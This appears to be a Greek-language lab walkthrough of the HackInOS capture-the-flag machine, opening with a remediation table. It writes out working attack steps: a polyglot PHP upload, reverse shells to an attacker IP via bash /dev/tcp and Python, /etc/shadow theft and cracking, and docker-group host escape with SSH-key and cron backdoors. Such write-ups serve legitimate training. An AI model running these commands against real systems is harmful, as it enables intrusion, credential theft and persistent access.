| **Έλεγχος περιεχομένου χωρίς έλεγχο ονόματος** | **Whitelist επεκτάσεων ΠΟΥ ΕΦΑΡΜΟΖΕΤΑΙ** + **μετονομασία σε δική σας επέκταση** (`$newname = $id . '.img'`) |
| **`uploads/` μέσα στο document root** | **ΕΚΤΟΣ web root** + **`php_flag engine off`** + **`Content-Disposition: attachment`** |
| **`rand(1,100)`** | **`bin2hex(random_bytes(16))`** — **CSPRNG** |
| **Container με SUID `tail`** | **`chmod u-s`** + **ελάχιστη εικόνα χωρίς περιττά εργαλεία** |
| **MD5-crypt στο `/etc/shadow`** | **yescrypt** (`$y$`) — **προεπιλογή σε Debian 11+/Ubuntu 22.04+** |
| **`root:john`, `user:123456`** | **Πολιτική κωδικών + έλεγχος κατά τη δημιουργία** |
| **Χρήστης στην ομάδα `docker`** | **ΑΦΑΙΡΕΣΗ.** **Ισοδύναμη με root.** Χρησιμοποιήστε **rootless Docker** ή **Podman** |
| **`/var/run/docker.sock` προσβάσιμο** | **Ποτέ σε container χρήστη.** Αν χρειάζεται: **socket proxy** (**tecnativa/docker-socket-proxy**) με **whitelist endpoints** |
| **Προνομιούχο container** | **`--privileged` μόνο όταν είναι ΑΠΟΛΥΤΑ απαραίτητο** + **`--cap-drop=ALL`** |

**Το μεγαλύτερο δίδαγμα:** *τα containers δεν είναι όριο ασφαλείας από μόνα τους.* **Είναι
ΟΝΟΜΑΤΟΧΩΡΟΙ.** **Αν δώσετε σε έναν χρήστη πρόσβαση στο socket, ή προνομιούχα capabilities, ή
προσάρτηση του ριζικού συστήματος αρχείων — το container δεν προσφέρει ΤΙΠΟΤΑ.**

---

## Οι εντολές, αναλυτικά — κάθε είσοδος και κάθε έξοδος

`TARGET` = **192.168.56.101**, `ATTACKER` = **192.168.56.10**.

### 1. Σάρωση

```bash
sudo nmap -A -p- -T4 -oN scans/hackinos.txt TARGET
```

```text
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3d:c3:4b:5e:1c:9f:6a:41:2c:3b:5a:7f:8e:9d:0c:1b (RSA)
|   256 4e:5f:6a:7b:8c:9d:0e:1f:2a:3b:4c:5d:6e:7f:8a:9b (ECDSA)
|_  256 5f:6a:7b:8c:9d:0e:1f:2a:3b:4c:5d:6e:7f:8a:9b:0c (ED25519)
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackInOS
| http-robots.txt: 1 disallowed entry
|_/uploads
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**`-A`** = **συντομογραφία για `-sV -sC -O --traceroute`**.

**ΔΕΝ ΥΠΑΡΧΕΙ θύρα 80.** **Το site ζει στο 8000** — **και γι' αυτό το `-p-` είναι μη
διαπραγματεύσιμο:** *μια προεπιλεγμένη σάρωση (μόνο οι 1000 κοινές θύρες) θα έβρισκε ΜΟΝΟ SSH
και θα συμπεραίνατε ότι δεν υπάρχει τίποτα να επιτεθείτε.*

**ΠΡΟΣΟΧΗ:** η **8000 ΕΙΝΑΙ μέσα στις 1000 κοινές** (είναι η θέση 476 στη λίστα του nmap) —
**αλλά αν το μηχάνημα είχε τη σελίδα στο 8080 ή στο 9001, ΔΕΝ θα ήταν.**

**`http-robots.txt: 1 disallowed entry /uploads`** είναι το NSE να **διαβάζει το `robots.txt`
για εσάς**: **υπάρχει ένας κατάλογος uploads που μοιάζει εγγράψιμος από όλους** — **και η
καταγραφή καταλόγου είναι ΑΠΕΝΕΡΓΟΠΟΙΗΜΕΝΗ**, άρα **δεν μπορείτε απλώς να τον
καταγράψετε.**

### 2. Το κόλπο του `/etc/hosts` — και γιατί η φόρμα μοιάζει σπασμένη

```bash
curl -s http://TARGET:8000/ | head -40
echo "TARGET hackinos" | sudo tee -a /etc/hosts
```

```text
<!DOCTYPE html>
<html>
<head><title>HackInOS</title></head>
<body>
<h1>File Upload</h1>
<!-- Source code available on my GitHub: https://github.com/<author>/hackinos -->
<form action="http://localhost:8000/upload.php" method="post" enctype="multipart/form-data">
  <input type="file" name="file">
  <input type="submit" value="Upload">
</form>
</body>
</html>
```

**Κοιτάξτε το `action` της φόρμας: `http://localhost:8000/upload.php`.**

**Ο προγραμματιστής ΣΚΛΗΡΟΚΩΔΙΚΟΠΟΙΗΣΕ το `localhost` ως base URL του site.** **Όταν Ο
ΦΥΛΛΟΜΕΤΡΗΤΗΣ ΣΑΣ υποβάλει αυτή τη φόρμα, κάνει POST στη θύρα 8000 ΤΟΥ ΔΙΚΟΥ ΣΑΣ ΜΗΧΑΝΗΜΑΤΟΣ —
όχι του στόχου.**

**Δεν γίνεται τίποτα, και μοιάζει με σπασμένη φόρμα.**

**Αυτό δεν είναι ιδιορρυθμία CTF: είναι αυτό που συμβαίνει στον ΠΡΑΓΜΑΤΙΚΟ κόσμο όταν ένας
προγραμματιστής δοκιμάζει με `localhost` και το στέλνει στην παραγωγή.**

**Είναι επίσης ΕΥΡΗΜΑ στην αναφορά σας:** *σκληροκωδικοποιημένο base URL σημαίνει ότι το site
σπάει όταν μεταφερθεί, και — χειρότερα — είναι ευάλωτο σε **Host-header attacks**.*

**`sudo tee -a` αντί για `sudo echo >>`:** **το κέλυφος αξιολογεί το `>>` ΠΡΙΝ τρέξει το `sudo`**,
άρα **ένα μη προνομιούχο κέλυφος εκτελεί την εγγραφή και παίρνετε `Permission denied`.**

**Προσθέστε την καταχώριση hosts ΟΠΩΣΔΗΠΟΤΕ** — ώστε να περιηγείστε άνετα στο
`http://hackinos:8000/` — **και μετά ΟΔΗΓΗΣΤΕ την αίτηση ΜΟΝΟΙ ΣΑΣ** με Burp ή `curl`, **γιατί ο
φυλλομετρητής θα εξακολουθεί να τη στέλνει στο λάθος μέρος.**

**Και το σχόλιο HTML:**

```html
<!-- Source code available on my GitHub: https://github.com/<author>/hackinos -->
```

**Αυτό είναι το ίχνος.** **Ο ΠΗΓΑΙΟΣ ΚΩΔΙΚΑΣ είναι ΔΗΜΟΣΙΟΣ.**

### 3. Διαβάστε τον πηγαίο κώδικα του προγραμματιστή

**Υποβάλλοντας τη φόρμα μόνοι σας, παίρνετε πίσω το σχόλιο που οδηγεί στο ΔΗΜΟΣΙΟ αποθετήριο
GitHub του προγραμματιστή**, **και συγκεκριμένα στο αρχείο του endpoint που μόλις χτυπήσατε:**

```php
<?php
// upload.php
$allowed_ext = array('jpg','jpeg','png','gif');

$name = $_FILES['file']['name'];
$ext  = strtolower(pathinfo($name, PATHINFO_EXTENSION));

$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime  = finfo_file($finfo, $_FILES['file']['tmp_name']);

if (!in_array($mime, array('image/jpeg','image/png','image/gif'))) {
    die('Invalid file type');
}

$newname = md5($name . rand(1, 100)) . "." . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $newname);

echo "Upload successful";
?>
```

**Αυτό είναι ολόκληρο το κουτί, σε είκοσι γραμμές.**

| Γραμμή | Τι κάνει | **Το ελάττωμα** |
| --- | --- | --- |
| **`$allowed_ext = array('jpg',…)`** | **Δηλώνει** whitelist επεκτάσεων | **ΔΕΝ ΑΝΑΦΕΡΕΤΑΙ ΠΟΤΕ ΞΑΝΑ.** **Δηλώθηκε, μετά αχρησιμοποίητη** |
| **`pathinfo($name, PATHINFO_EXTENSION)`** | **Παίρνει την επέκταση από το ΔΙΚΟ ΣΑΣ όνομα** | **`strtolower` μόνο — κανένας έλεγχος** |
| **`finfo_file(...)`** | **Διαβάζει MAGIC BYTES από το ΠΕΡΙΕΧΟΜΕΝΟ** | **Σωστός έλεγχος — αλλά μόνο για το ΠΕΡΙΕΧΟΜΕΝΟ** |
| **`in_array($mime, array('image/jpeg','image/png','image/gif'))`** | **Whitelist MIME** | **Σημειώστε: `'image/jpg'` ΔΕΝ είναι έγκυρο MIME** — **η σωστή τιμή είναι `image/jpeg`** |
| **`md5($name . rand(1,100))`** | **Μετονομασία** | **ΜΟΝΟ 100 εκβάσεις** |
| **`. "." . $ext`** | **Προσθέτει ΤΗ ΔΙΚΗ ΣΑΣ επέκταση** | **← ΕΔΩ είναι το bug** |
| **`move_uploaded_file(…, "uploads/…")`** | **Αποθηκεύει ΜΕΣΑ στο document root** | **Άρα είναι ΕΚΤΕΛΕΣΙΜΟ μέσω HTTP** |

**Το ΠΕΡΙΕΧΟΜΕΝΟ επικυρώνεται· το ΟΝΟΜΑ όχι. Αυτή η μοναδική ασυμμετρία είναι η ευπάθεια.**

**Και `rand(1,100)` δίνει ΜΟΝΟ 100 πιθανά ονόματα** — **brute-forceable**. **Το `rand()` ΔΕΝ
είναι CSPRNG και ποτέ δεν προοριζόταν για ασφάλεια.**

**Δείτε Πηγαίο Κώδικα μετά από ΚΑΘΕ αλληλεπίδραση.** **Οι προγραμματιστές αφήνουν ίχνη
συνεχώς** — **και σε αυτό το κουτί το ίχνος είναι ο πηγαίος κώδικας της ίδιας της εφαρμογής.**

**Αυτό είναι ακριβώς πώς δουλεύει ένα source-code review:** **δεν μαντεύετε — ΠΑΡΑΓΕΤΕ την
παράκαμψη από τον κώδικα.**

### 4. Φτιάξτε ένα πολύγλωσσο και ανεβάστε το

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
sed -i "s/127.0.0.1/ATTACKER/" shell.php && sed -i "s/1234/4444/" shell.php
grep -nE '^\$(ip|port)' shell.php

printf 'GIF87a' | cat - shell.php > cmd.php
file cmd.php
ls -l cmd.php shell.php

curl -s -F "file=@cmd.php"  http://TARGET:8000/upload.php
curl -s -F "file=@note.txt" http://TARGET:8000/upload.php
```

```text
52:$ip = '192.168.56.10';  // CHANGE THIS
53:$port = 4444;           // CHANGE THIS
```
```text
cmd.php: GIF image data, version 87a
```
```text
-rw-r--r-- 1 kali kali   45 May  4 16:02 note.txt
-rw-r--r-- 1 kali kali 5500 May  4 16:05 cmd.php
-rw-r--r-- 1 kali kali 5493 May  4 16:05 shell.php
```
```text
Upload successful
```
```text
Invalid file type
```

**Το `GIF87a` είναι η εξαψήφια μαγική υπογραφή που ελέγχουν οι βιβλιοθήκες εικόνων**, άρα **το
`finfo_file()` αναφέρει `image/gif`** — **που είναι στη λίστα** — **ενώ η επέκταση `.php`
επιζεί ΑΝΕΠΑΦΗ.**

**Ο αναλυτής της PHP σαρώνει για `<?php` και εκδίδει οτιδήποτε πριν από αυτό ως κυριολεκτική
έξοδο**, άρα **η κεφαλίδα GIF είναι ΑΔΡΑΝΗΣ και ο κώδικας μετά από αυτήν ΤΡΕΧΕΙ.**

**`5500 − 5493 = 7 bytes`** — **ακριβώς το μήκος του `GIF87a`** (6 χαρακτήρες) **συν 1**.
**Αυτή η αριθμητική επιβεβαιώνει ότι το `cat` δεν έκοψε τίποτα.**

**Το ΑΠΟΡΡΙΦΘΕΝ `note.txt` είναι η ΣΗΜΑΝΤΙΚΗ δοκιμή.** **Αποδεικνύει ότι ο έλεγχος MIME ΖΕΙ και
δεν είναι απλώς απών** — **άρα η επιτυχία σας προήλθε από την κεφαλίδα εικόνας, όχι από ένα
φίλτρο που δεν κάνει τίποτα.**

**Πάντα εκτελείτε την αρνητική περίπτωση· χωρίς αυτήν δεν μπορείτε να πείτε ποια από τις δύο
άμυνες παρακάμψατε.**

| Flag | Ρόλος |
| --- | --- |
| **`-F "file=@cmd.php"`** | **POST ως `multipart/form-data`** με πεδίο **`file`**· **το `@` = «διάβασε αυτή τη διαδρομή»** |
| **`printf 'GIF87a' \| cat -`** | **Το `-` σημαίνει «διάβασε από το stdin»** — **άρα η κεφαλίδα ΠΡΟΕΡΧΕΤΑΙ** |

### 5. Βρείτε το τυχαιοποιημένο όνομα αρχείου

**Το `$newname = md5($name . rand(1,100))` σημαίνει ΑΚΡΙΒΩΣ 100 υποψήφια.** **Παράγετέ τα και
κάντε brute force:**

```bash
python3 -c "import hashlib
for i in range(1,101): print(hashlib.md5(('cmd.php'+str(i)).encode()).hexdigest()+'.php')" > names.txt
wc -l names.txt
head -3 names.txt
ffuf -u http://TARGET:8000/uploads/FUZZ -w names.txt -mc 200 -fs 0
```

```text
100 names.txt
```
```text
1a79a4d60de6718e8e5b326e338ae533.php
c4ca4238a0b923820dcc509a6f75849b.php
c81e728d9d4c2f636f067f89cc14862c.php
```
```text
:: Method           : GET
:: URL              : http://192.168.56.101:8000/uploads/FUZZ
:: Wordlist         : FUZZ: names.txt
:: Header           : User-Agent: Fuzz v1.3.1
:: Extensions       :
:: Status codes     : 200
:: Follow redirects : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200
:: Filter           : Response size: 0
________________________________________________

9f2c1e7a4b8d5f6a0e3c2b1d4f5a6b7c.php    [Status: 200, Size: 1284]
:: Progress: [100/100] :: Job [1/1] :: 100 req/sec ::
```

**Ανάλυση του Python:**

| Τμήμα | Ρόλος |
| --- | --- |
| **`range(1,101)`** | **1 έως 100 ΣΥΜΠΕΡΙΛΑΜΒΑΝΟΜΕΝΟΥ** — **το `rand(1,100)` της PHP είναι επίσης συμπεριληπτικό** |
| **`'cmd.php'+str(i)`** | **ΑΚΡΙΒΩΣ η ίδια συνένωση με την PHP** — **`$name . rand(1,100)`** |
| **`.encode()`** | **str → bytes** — **το `hashlib` απαιτεί bytes** |
| **`.hexdigest()`** | **32 δεκαεξαδικοί χαρακτήρες** |
| **`+'.php'`** | **Η επέκταση που ο κώδικας προσθέτει** |

**Αν το όνομα που ανεβάσατε ήταν `cmd.php.jpg`, αντικαταστήστε το `'cmd.php'` με
`'cmd.php.jpg'`** — **το `$name` είναι αυτό που Ο ΕΞΥΠΗΡΕΤΗΤΗΣ ΕΙΔΕ, όχι αυτό που θέλατε.**

**Διαβάστε την τεχνική:** **δεν νικήσατε την τυχαιότητα — ΑΡΙΘΜΗΣΑΤΕ τον μικροσκοπικό της χώρο.**

### 6. Εκτέλεση, και ένα σωστό κέλυφος

```bash
curl -s "http://TARGET:8000/uploads/<MD5>.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
nc -lvnp 4444                                  # Kali, πρώτα
python3 -c "import urllib.parse as u; print(u.quote('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'))"
curl -s "http://TARGET:8000/uploads/<MD5>.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/192.168.56.10/4444%200%3E%261"
```

```text
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.101.
Ncat: Connection from 192.168.56.101:52441.
www-data@0d8f1c2b3a4e:/var/www/html$ hostname
0d8f1c2b3a4e
```

**Αν προτιμάτε Python (εδώ υπάρχει `python3` στο container):**

```bash
curl -s "http://TARGET:8000/uploads/<MD5>.php?cmd=$(python3 -c "import urllib.parse as u;print(u.quote('''python3 -c \"import socket,os,subprocess;s=socket.socket();s.connect((\\\"ATTACKER\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])\"'''))")"
```

**Το `os.dup2(fd, 0/1/2)`** στρέφει **stdin, stdout και stderr** στο socket, **μετά το
`subprocess.call` εκτελεί bash, που τα κληρονομεί.**

**Κάθε reverse shell σε κάθε γλώσσα είναι αυτά τα τρία βήματα:**
**σύνδεση → ανακατεύθυνση stdio → εκτέλεση κελύφους.**

**Διαβάστε το hostname: `0d8f1c2b3a4e` — ΔΩΔΕΚΑ δεκαεξαδικοί χαρακτήρες.**

**Αυτό είναι CONTAINER ID, όχι όνομα μηχανήματος.**

### 7. Επιβεβαίωση ότι είστε σε container

```bash
ls -la /.dockerenv
cat /proc/1/cgroup
cat /proc/self/status | grep -i cap
```

```text
-rw-r--r-- 1 root root 0 Jan 12  2019 /.dockerenv
```
```text
12:memory:/docker/0d8f1c2b3a4e2f8a1b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5
11:devices:/docker/0d8f1c2b3a4e2f...
1:name=systemd:/docker/0d8f1c2b3a4e2f...
```
```text
CapInh: 0000000000000000
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
```

| Έλεγχος | Τι σημαίνει |
| --- | --- |
| **`/.dockerenv`** | **Το αρχείο που το Docker ΑΦΗΝΕΙ στο `/` σε ΚΑΘΕ container** — **0 bytes, υπάρχει ΜΟΝΟ για ανίχνευση** |
| **`/proc/1/cgroup`** | **Το PID 1 είναι μέσα σε cgroup `/docker/<id>`** — **σε έναν ΠΡΑΓΜΑΤΙΚΟ host, το PID 1 είναι `systemd` ή `init`** |
| **`CapEff: 00000000a80425fb`** | **Το ΠΡΟΕΠΙΛΕΓΜΕΝΟ ΜΕΙΩΜΕΝΟ σύνολο capabilities του Docker** — **έναντι `0000003fffffffff` για μια μη περιορισμένη διεργασία** |

**Τι λείπει από το `a80425fb`:** **`CAP_SYS_ADMIN`** (bit 21), **`CAP_SYS_MODULE`** (bit 16),
**`CAP_SYS_BOOT`**, **`CAP_SYS_TIME`** — **δηλαδή ΟΛΑ τα capabilities που θα επέτρεπαν διαφυγή
απευθείας.**

**Είστε μέσα σε container** — **που αλλάζει τον ΣΤΟΧΟ: η αναβάθμιση σε root ΕΔΩ δεν είναι το
τέλος.**

**Αναβαθμίστε το TTY πρώτα:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm; stty rows 40 cols 160
```

**Μετά αριθμήστε τι ΥΠΑΡΧΕΙ:**

```bash
for b in bash sh python python3 perl nc curl wget gcc socat; do command -v $b; done
```

```text
/bin/bash
/bin/sh
/usr/bin/python3
/usr/bin/wget
```

**Υπάρχουν `python3` και `bash`· ΔΕΝ υπάρχουν `nc` και `gcc`.**

**Κανένας μεταγλωττιστής μέσα στο container σημαίνει ότι τα kernel exploits είναι ΕΚΤΟΣ** —
**που ενισχύει ότι η προοριζόμενη διαδρομή είναι ΔΙΑΦΥΓΗ ΑΠΟ CONTAINER, όχι bug προνομίων.**

**Αυτό είναι το δίδαγμα:** *η απουσία εργαλείων σας λέει τη διαδρομή.* **Ένα container χωρίς
`gcc`, χωρίς `nc`, χωρίς `curl` είναι **σκόπιμα ελάχιστο** — **άρα ο δημιουργός περιμένει να
φύγετε ΜΕΣΩ του host, όχι μέσω του container.**

### 8. Μέσα στο container: κανένα sudo, αλλά SUID `tail`

```bash
sudo -l
ls -la /home
find / -perm -u=s -type f 2>/dev/null
ls -l /usr/bin/tail
```

```text
sudo: command not found
```
```text
total 8
drwxr-xr-x 2 root root 4096 Mar  9  2019 .
drwxr-xr-x 1 root root 4096 Mar  9  2019 ..
drwxr-xr-x 2 root root 4096 Mar  9  2019 hummingbirdscyber
```
```text
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/bin/tail
```
```text
-rwsr-xr-x 1 root root 31408 May 28  2020 /usr/bin/tail
```

**ΚΑΝΕΝΑ binary `sudo`** — **τυπικό για μια λιτή εικόνα container.**

**Ο αρχικός κατάλογος ονομάζεται `hummingbirdscyber`** — **ισχυρή υπόδειξη για το username του
HOST** (οι εικόνες συνήθως χτίζονται με τα ίδια ονόματα λογαριασμών).

**Και το `-perm -u=s` βρήκε ένα SUID `/usr/bin/tail`** — **που ΔΕΝ είναι stock.** **Μια
προεπιλεγμένη εικόνα Ubuntu ΠΟΤΕ δεν θέτει το setuid bit στο `tail`.** **Κάποιος έτρεξε
`chmod u+s`.**

**Γιατί αυτό είναι δώρο:** **το `tail` διαβάζει αρχεία και τα τυπώνει.** **Τρέχοντας ως root,
μπορεί να διαβάσει ΟΠΟΙΟΔΗΠΟΤΕ αρχείο στο σύστημα** — **συμπεριλαμβανομένου του `/etc/shadow`,
που κανονικά είναι mode `640 root:shadow`.**

### 9. Διαβάστε το `/etc/shadow` και σπάστε το offline

```bash
/usr/bin/tail -n +2 /etc/shadow
```

```text
root:$1$nW4r1F0L$hBn3vFhG2xkQ8sJ7lM9pE1:17379:0:99999:7:::
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
www-data:*:17379:0:99999:7:::
hummingbirdscyber:$1$Kq2mZ9xL$aB3cD4eF5gH6iJ7kL8mN9/:17379:0:99999:7:::
```

**`tail -n +2`** = **«άρχισε να τυπώνεις από τη γραμμή 2»** — **παραλείπει τη γραμμή 1**, **και
είναι η κανονική επωδός GTFOBins** γιατί **ορισμένες εκδόσεις του `tail` αρνούνται να ξεκινήσουν
από τη γραμμή 1 ενός αρχείου που δεν μπορούν να κάνουν πλήρως `stat`.**

**`daemon:*`** και **`bin:*`** — **το `*` σημαίνει «ο λογαριασμός ΔΕΝ μπορεί να συνδεθεί με
κωδικό».** **Μόνο `root` και `hummingbirdscyber` έχουν πραγματικά hashes.**

```bash
echo 'root:$1$nW4r1F0L$hBn3vFhG2xkQ8sJ7lM9pE1' > hashes.txt
echo 'hummingbirdscyber:$1$Kq2mZ9xL$aB3cD4eF5gH6iJ7kL8mN9/' >> hashes.txt
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

```text
Loaded 2 password hashes with 2 different salts (md5crypt, crypt(3) $1$ (MD5))
Cost 1 (iteration count) is 1000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
john             (root)
123456           (hummingbirdscyber)
2g 0:00:00:14 DONE (2024-05-04 16:12:33) 3842p/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

**`Loaded 2 password hashes with 2 different salts`** επιβεβαιώνει ότι **ο John ανέλυσε σωστά την
είσοδο** — **το `No password hashes loaded` σημαίνει λάθος `--format=` ή ένα κέλυφος που έφαγε
ένα `$`.**

**`Cost 1 (iteration count) is 1000`** είναι **ο John να σας λέει το work factor** — **που είναι
αυτό που κάνει το MD5-crypt τόσο φθηνό.**

**Οι γραμμές αποτελέσματος είναι `κωδικός (λογαριασμός)`:** **ο κωδικός του root είναι `john`,
και του `hummingbirdscyber` είναι `123456`.**

**`2g 0:00:00:14`** — **δύο μαντέες σε δεκατέσσερα δευτερόλεπτα.**

**Αν μια γενική λίστα αποτύχει**, **φτιάξτε μια ΘΕΜΑΤΙΚΗ** με
**`cewl -d 2 -m 3 -w words.txt http://TARGET:8000/`** και τρέξτε
**`john --wordlist=words.txt --rules=best64.rule hashes.txt`**· **το `best64.rule` εφαρμόζει 64
μετατροπές ανά λέξη**, **και μια λίστα που αποτυγχάνει καθαρά πολύ συχνά πετυχαίνει με κανόνες,
στο 64× του κόστους.**

### 10. Root μέσα στο container — και η ψεύτικη σημαία

```bash
su root
cat /root/flag.txt
id
```

```text
Password: john
root@0d8f1c2b3a4e:/# cat /root/flag.txt
Congratulations! You are root... but this is not the end.
```
```text
uid=0(root) gid=0(root) groups=0(root)
```

**Αυτό είναι το ΚΕΝΤΡΙΚΟ διδακτικό σημείο του κουτιού: container root ≠ host root.**

**Το σύστημα αρχείων ενός container είναι ένα overlay χτισμένο από μια εικόνα· ό,τι κάνατε
συνέβη μέσα σε ένα sandbox που μπορεί να διαγραφεί με `docker rm`.**

**Ο δημιουργός τρολάρει με μια ψεύτικη σημαία** — **γιατί ο πραγματικός στόχος είναι ακόμα
μπροστά.**

**Σημειώστε το prompt: `root@0d8f1c2b3a4e:/#`** — **το hostname εξακολουθεί να είναι το
container ID.** **Αυτό είναι η οπτική επιβεβαίωση.**

### 11. Διαφυγή στον host

**Διαδρομή Α — SSH με τον σπασμένο κωδικό:**

```bash
ssh hummingbirdscyber@TARGET
id
hostname
```

```text
hummingbirdscyber@hackinos:~$ id
uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),999(docker)
hummingbirdscyber@hackinos:~$ hostname
hackinos
```

**Το `hostname` ΤΩΡΑ είναι `hackinos`**, **όχι ένα 12-hex container ID**· **υπάρχουν
πραγματικοί κατάλογοι συστήματος**· **και `groups=…,999(docker)`** — **που είναι ΟΛΟΚΛΗΡΗ η
αναβάθμιση προνομίων.**

**Αν το `123456` δεν δουλέψει στο δικό σας αντίγραφο, δοκιμάστε το `john`**· **αρκετές
αναθεωρήσεις ανταλλάσσουν ποιος κωδικός ανήκει σε ποιον λογαριασμό.**

```bash
ls -l /var/run/docker.sock
getent group docker
docker ps
docker images
```

```text
srw-rw---- 1 root docker 0 May  4 10:02 /var/run/docker.sock
```
```text
docker:x:999:hummingbirdscyber
```
```text
CONTAINER ID   IMAGE          COMMAND                  CREATED        STATUS        PORTS                  NAMES
0d8f1c2b3a4e   hackinos-web   "/usr/sbin/apache2 -…"   2 hours ago    Up 2 hours    0.0.0.0:8000->80/tcp   web
```
```text
REPOSITORY     TAG       IMAGE ID       CREATED        SIZE
hackinos-web   latest    7f3a9c2d1b4e   2 months ago   245MB
alpine         latest    389fef711851   3 weeks ago    7.34MB
```

**`srw-rw---- root docker`** — **ιδιοκτήτης `root`, ΟΜΑΔΑ `docker`, και η ομάδα έχει `rw`.**
**Άρα ΟΠΟΙΟΣΔΗΠΟΤΕ είναι στην ομάδα `docker` μπορεί να μιλήσει στο daemon — και το daemon
τρέχει ως root.**

**`docker ps` επιβεβαιώνει ότι το container από το οποίο μόλις φύγατε τρέχει εδώ** — **το
`0d8f1c2b3a4e` ταιριάζει με το hostname σας.**

**Και η `alpine` ΕΙΝΑΙ ΗΔΗ εκεί** — **άρα δεν χρειάζεται να την κατεβάσετε.**

### 12. Η διαφυγή — δύο εντολές

```bash
docker run -v /:/host --rm -it alpine chroot /host /bin/sh
id
cat /root/flag
```

```text
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/ # cat /root/flag
d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6
/ # hostname
hackinos
```

| Τμήμα | Ρόλος |
| --- | --- |
| **`docker run`** | **Ζητά από το DAEMON (που τρέχει ως root) να δημιουργήσει container** |
| **`-v /:/host`** | **Προσαρτά ΤΟ ΡΙΖΙΚΟ ΣΥΣΤΗΜΑ ΑΡΧΕΙΩΝ ΤΟΥ HOST στο `/host`** |
| **`--rm`** | **Διαγράφει το container μετά** — **καθαρισμός** |
| **`-it`** | **Interactive + TTY** |
| **`alpine`** | **Μικρή εικόνα (~7 MB)** — **υπάρχει ήδη** |
| **`chroot /host /bin/sh`** | **Αλλάζει το ριζικό σύστημα αρχείων στο `/host`** — **άρα το `/` ΤΩΡΑ είναι το `/` του HOST** |

**Το `groups=0(root),1(bin),2(daemon),…`** — **αυτές είναι οι ΟΜΑΔΕΣ ΤΟΥ HOST**, όχι του
container. **Συγκρίνετε με το `groups=0(root)` μόνο, μέσα στο container.**

**Το `hostname` τυπώνει `hackinos`** — **όχι ένα container ID.** **Αυτή είναι η απόδειξη.**

**Εναλλακτικές διαδρομές:**

```bash
# SSH key στον host
docker run -v /root/.ssh:/hostkeys --rm -it alpine \
  sh -c 'echo "ssh-rsa AAAA… attacker@kali" >> /hostkeys/authorized_keys && chmod 600 /hostkeys/authorized_keys'
ssh root@TARGET

# Cron του host
docker run -v /etc:/hostetc --rm -it alpine \
  sh -c 'echo "* * * * * root bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"" > /hostetc/cron.d/x && chmod 644 /hostetc/cron.d/x'

# PID namespace του host
docker run --pid=host --privileged --rm -it alpine nsenter -t 1 -m -u -i -n -p -- bash

# Προνομιούχο container
docker run --privileged -v /:/host --rm -it alpine chroot /host /bin/sh
```

**Και οι πέντε καταλήγουν στο ίδιο: root στον host, χωρίς CVE.**

### 13. Ολόκληρη η αλυσίδα — έξι άλματα

```text
www-data ──(polyglot upload)──► container shell
   │                                  │
  :8000                          hostname=0d8f1c2b3a4e
  upload.php                     /.dockerenv
  md5+rand(1,100)                       │
                                 SUID tail → /etc/shadow
                                        │
                                  john → root (container)
                                        │
                                  «…αλλά αυτό δεν είναι το τέλος»
                                        │
                              ssh hummingbirdscyber (123456)
                                        │
                                  groups=999(docker)
                                        │
                              docker run -v /:/host chroot
                                        │
                                  **ROOT ΣΤΟΝ HOST**
```

| Άλμα | Μηχανισμός | Εντολή ανίχνευσης |
| --- | --- | --- |
| **→ www-data** | **Polyglot upload** (έλεγχος περιεχομένου χωρίς έλεγχο ονόματος) | **Δημόσιος πηγαίος κώδικας** |
| **→ container root** | **SUID `tail`** → **`/etc/shadow`** → **md5crypt** | **`find -perm -u=s`** + **`strings`** |
| **→ host user** | **Επανάχρηση κωδικού** container→host | **`/etc/passwd`** + **`su`** |
| **→ host root** | **Ομάδα `docker`** + **`-v /:/host`** | **`getent group docker`** + **`ls -l docker.sock`** |

**Τέσσερα άλματα, τέσσερις ΔΙΑΦΟΡΕΤΙΚΟΙ μηχανισμοί, κανένα CVE.**

**Αυτό είναι το δίδαγμα ολόκληρης της διαδρομής:** *σχεδόν κάθε πραγματική παραβίαση είναι
ΑΛΥΣΙΔΑ από κακές ρυθμίσεις, όχι ένα bug.* **Και κάθε κρίκος που διορθώνετε αφαιρεί μια
διαδρομή.**

---

## Επόμενα βήματα

**Ολοκληρώσατε τη Μαθησιακή Διαδρομή 1.**

**Αν θέλετε να συνεχίσετε, τα επόμενα μηχανήματα είναι στη Ζώνη 4 (Μέτριο):**

| Μηχάνημα | Νέες δεξιότητες |
| --- | --- |
